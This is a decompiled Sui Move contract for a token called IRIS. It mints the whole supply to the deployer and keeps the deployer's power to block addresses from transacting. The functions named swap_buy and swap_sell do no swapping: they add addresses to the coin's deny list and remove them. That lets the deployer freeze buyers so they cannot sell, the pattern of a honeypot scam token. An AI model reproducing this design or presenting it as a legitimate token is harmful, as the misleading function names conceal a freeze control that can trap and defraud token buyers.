module 0x1d0315b8cd8aef4bd0624715afe9dedf3130eff72269f1a2c9802dc2cba99756::iris {
    struct IRIS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: IRIS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<IRIS>(arg0, 9, b"IRIS", b"IRIS", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmPoC12PRM5x4F3PyAzfi88NveCqVq91wdXTsawrfDNEzU"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<IRIS>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<IRIS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<IRIS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<IRIS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<IRIS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<IRIS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<IRIS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<IRIS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

